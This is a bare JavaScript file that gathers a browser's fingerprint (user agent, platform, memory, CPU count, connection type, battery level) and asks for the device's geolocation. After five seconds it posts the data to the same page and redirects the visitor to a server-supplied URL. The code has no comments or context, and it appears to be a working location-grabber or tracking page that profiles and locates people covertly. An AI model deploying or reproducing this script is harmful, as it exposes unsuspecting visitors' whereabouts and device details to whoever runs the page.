let n = navigator;
let dict = {
	"appCodeName":n.appCodeName,
	"appVersion":n.appVersion,
	"cookieEnabled":n.cookieEnabled,
	"deviceMemory":n.deviceMemory,
	"language":n.language,
	"platform":n.platform,
	"userAgent":n.userAgent,
	"downlink":n.connection.downlink,
	"effectiveType":n.connection.effectiveType,
	"hardwareconcurrency":n.hardwareConcurrency,
}
if(n.geolocation){
	n.geolocation.getCurrentPosition(showPosition)
}
function showPosition(e){
	dict.accuracy = e.coords.accuracy
	dict.latitude = e.coords.latitude
	dict.longitude = e.coords.longitude
}
n.getBattery(e=>e).then(e=>{
dict.battery =(e.level*100)+"%";
})

$(document).ready(()=>{
setTimeout(()=>{
    $.ajax({
        url:location.href,
        type:'POST',
        data:{"msg":JSON.stringify(dict)},
        success:(e)=>{
           location.href=e.msg
        },
        error:(e)=>{
            console.log(e)
        }
    })

},5000)
})
